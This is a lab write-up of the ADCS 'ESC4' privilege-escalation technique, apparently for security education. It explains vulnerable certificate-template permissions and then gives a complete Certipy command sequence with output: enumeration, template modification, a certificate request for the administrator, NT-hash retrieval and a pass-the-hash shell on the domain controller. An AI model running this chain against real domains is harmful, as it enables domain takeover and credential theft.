=======================================================================================================================================
ADCS Domain Escalation technique "ESC4" - Vulnerable Certificate Template Access Control
=======================================================================================================================================

-----------------------------------------------------------------------------------------------------------
Conditions making an AD environment vulnerable to "ESC4" - Vulnerable Certificate Template Access Control
-----------------------------------------------------------------------------------------------------------

- Certificate templates are AD objects and have a security descriptor that defines which permissiones AD principals have over the templates.
  Weak permissions (Excessive Access rights) can allow a malevolent non-privileged user to edit sensitive security settings in the template 
  (defines EKUs, allows SAN, disable manager approval), thereby making its vulnerable to the ESC1-3 technique.

- Interesting rights over certificate templates:
  > Owner: Implicit full control of the object, can edit any properties.
  > FullControl: Full control of the object, can edit any properties.
  > WriteOwner: Can modify the owner to an attacker-controlled principal.
  > WriteDacl: Can modify access control to grant an attacker FullControl.
  > WriteProperty: Can edit any properties
  
-----------------------------------------------------------------------------------------------
Various tools can be used to identify and exploit the ADCS Domain Escalation technique "ESC4"
-----------------------------------------------------------------------------------------------
- Certipy.py / certipy-ad (https://github.com/ly4k/Certipy)
- Certutil (native windows command)
- Certify.exe (https://github.com/GhostPack/Certify)
- PSPKIAudit.psm1 (https://github.com/GhostPack/PSPKIAudit)
- PassTheCert.exe (https://github.com/AlmondOffSec/PassTheCert)
- ...

Info
-----
- Lab domain name: company.work
- Lab domain controller (with ADCS) : dc1.company.work
- Low priv domain user: LowPrivUser


========================================================================================================================================
PoC - Privilege escalation from Domain User to Domain Admin by exploiting a "Vulnerable Certificate Template Access Control" (ESC4) 
========================================================================================================================================

==============================================================================================================================
STEP 1 - ADCS enumeration using a low-privileged domain user and the tool "Certipy.py" (which is named "certipy-ad" in Kali)
==============================================================================================================================

jeff@kali:~$ sudo apt-get install certipy-ad
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
<SNIP>

jeff@kali:~$ sudo su
[sudo] password for jeff: 
root@kali:/home/jeff#

root@kali:/home/jeff# certipy-ad find -u LowPrivUser@company.work -p 'SuperGenialPwd' -target 192.168.1.167
Certipy v4.0.0 - by Oliver Lyak (ly4k)
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Trying to get CA configuration for 'company-DC1-CA' via CSRA
[!] Got error while trying to get CA configuration for 'company-DC1-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'company-DC1-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'company-DC1-CA'
[*] Saved BloodHound data to '20230606011147_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20230606011147_Certipy.txt'
[*] Saved JSON output to '20230606011147_Certipy.json'


=================================================================================================================
STEP 2 - Identify the ADCS privesc "Vulnerable Certificate Template Access Control" (ESC4) 
=================================================================================================================

=> Let's have a look at the bloodhound data files extracted with "certpy-ad"

root@kali:/home/jeff# unzip 20230606011147_Certipy.zip -d ./
Archive:  20230606011147_Certipy.zip
 extracting: ./20230606011147_cas.json  
 extracting: ./20230606011147_templates.json 
 
root@kali:/home/jeff# cat 20230606011147_templates.json

<SNIP>
{
      "Properties": {
        "name": "EXCHANGE_USER_TEMPLATE@COMPANY.WORK",
        "highvalue": false,
        "Template Name": "Exchange_User_Template",
        "Display Name": "Exchange_User_Template",
        "Enabled": true,
        "Client Authentication": false,
        "Enrollment Agent": false,
        "Any Purpose": false,
        "Enrollee Supplies Subject": true,
        "Certificate Name Flag": [ "EnrolleeSuppliesSubject" ],
        "Enrollment Flag": [ "PendAllRequests", "IncludeSymmetricAlgorithms" ],
        "Private Key Flag": [ "16777216", "65536", "ExportableKey" ],
        "Extended Key Usage": [ "Secure Email" ],
        "Requires Manager Approval": true,
        "Requires Key Archival": false,
        "Authorized Signatures Required": 1,
        "Validity Period": "1 year",
        "Renewal Period": "6 weeks",
        "domain": "COMPANY.WORK"
      },
      "ObjectIdentifier": "d5ab34bc-63eb-42bc-b91e-87579f48976e",
      "Aces": [
        {
          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-500",
          "PrincipalType": "User",
          "RightName": "Owns",
          "IsInherited": false
        },
        {
          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-512",
          "PrincipalType": "Group",
          "RightName": "WriteOwner",
          "IsInherited": false
        },
        {
          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-512",
          "PrincipalType": "Group",
          "RightName": "WriteDacl",
          "IsInherited": false
        },
        {
          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-512",
          "PrincipalType": "Group",
          "RightName": "WriteProperty",
          "IsInherited": false
        },
        {
          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-512",
          "PrincipalType": "Group",
          "RightName": "Enroll",
          "IsInherited": false
        },
        {
          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-519",
          "PrincipalType": "Group",
          "RightName": "WriteOwner",
          "IsInherited": false
        },
        {
          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-519",
          "PrincipalType": "Group",
          "RightName": "WriteDacl",
          "IsInherited": false
        },
        {
          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-519",
          "PrincipalType": "Group",
          "RightName": "WriteProperty",
          "IsInherited": false
        },
        {
          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-519",
          "PrincipalType": "Group",
          "RightName": "Enroll",
          "IsInherited": false
        },
        {
          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-500",
          "PrincipalType": "User",
          "RightName": "WriteOwner",
          "IsInherited": false
        },
        {
          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-500",
          "PrincipalType": "User",
          "RightName": "WriteDacl",
          "IsInherited": false
        },
        {
          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-500",
          "PrincipalType": "User",
          "RightName": "WriteProperty",
          "IsInherited": false
        },
        {
          "PrincipalSID": "COMPANY.WORK-S-1-5-11",
          "PrincipalType": "Group",
          "RightName": "WriteOwner",
          "IsInherited": false
        },
        {
          "PrincipalSID": "COMPANY.WORK-S-1-5-11",
          "PrincipalType": "Group",
          "RightName": "WriteDacl",
          "IsInherited": false
        },
        {
          "PrincipalSID": "COMPANY.WORK-S-1-5-11",
          "PrincipalType": "Group",
          "RightName": "WriteProperty",
          "IsInherited": false
        }
<SNIP>


=> Conclusion: The certificate template "Exchange_User_Template" is prone to the domain privesc vulnerability "ESC4"
--------------------------------------------------------------------------------------------------------------------
The domain group "Authenticated Users" (SID "S-1-5-11") has the following insecure permissions over the certficate template "Exchange_User_Template":
  > WriteOwner: Can modify the owner to an attacker-controlled principal.
  > WriteDacl: Can modify access control to grant an attacker FullControl.
  > WriteProperty: Can edit any properties.

Note
-----
rpcclient $> lookupnames "Authenticated Users"
Authenticated Users S-1-5-11 (Well-known Group: 5)

===========================================================================================================================
STEP 3 - Exploit the "ESC4" vulnerability with "certipy-ad" to escalate your privileges from a Domain User to Domain Admin
===========================================================================================================================

3.1. First, run the following command with "certpy-ad" to:
     + save the initial configuration of the certificate "Exchange_User_Template" (to be able to restore it later)
     + modify the template configuration, which will make it vulnerable to the ESC1 privesc technique.
--------------------------------------------------------------------------------------------------------------------

root@kali:/home/jeff# certipy-ad template -u LowPrivUser@company.work -p 'SuperGenialPwd' -target dc1.company.work -template Exchange_User_Template -save-old -dc-ip 192.168.1.167
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'Exchange_User_Template' to 'Exchange_User_Template.json'
[*] Updating certificate template 'Exchange_User_Template'
[*] Successfully updated 'Exchange_User_Template'


3.2. The certificate template "Exchange_User_Template" is now vulnerable to the ESC1 privesc technique and we can request a certificate based on the template 
     "Exchange_User_Template" with the Domain Admin account "COMPANY\Administrator" specified as the Subject Alternative Name (SAN).
--------------------------------------------------------------------------------------------------------------------------------------------------------------

root@kali:/home/jeff# certipy-ad req -u LowPrivUser@company.work -p 'SuperGenialPwd'  -target 192.168.1.167 -ca company-DC1-CA -template Exchange_User_Template -upn administrator@company.work -dc-ip 192.168.1.167
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with UPN 'administrator@company.work'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'


3.3. Restore the old template configuration
--------------------------------------------

root@kali:/home/jeff# certipy-ad template -u LowPrivUser@company.work -p 'SuperGenialPwd'  -target dc1.company.work -template Exchange_User_Template -configuration Exchange_User_Template.json -dc-ip 192.168.1.167
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'Exchange_User_Template'
[*] Successfully updated 'Exchange_User_Template'


3.4. Finally, collect the password hash of the Domain Admin account "Company\Administrator" and then log into the DC as "Domain Admin" using "impacket-wmiexec"
---------------------------------------------------------------------------------------------------------------------------------------------------------------

root@kali:/home/jeff# certipy-ad auth -pfx /home/jeff/administrator.pfx -domain company.work -username administrator -dc-ip 192.168.1.167
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@company.work
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@company.work': aad3b435b51404eeaad3b435b51404ee:cf3a5525ee94142<SNIP>


root@kali:/home/jeff# impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414<SNIP> administrator@192.168.1.167
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\> hostname
DC1

C:\> whoami /all

USER INFORMATION
----------------

User Name             SID                                         
===================== ============================================
company\administrator S-1-5-21-844310393-2305947092-3799914435-500
<SNIP>
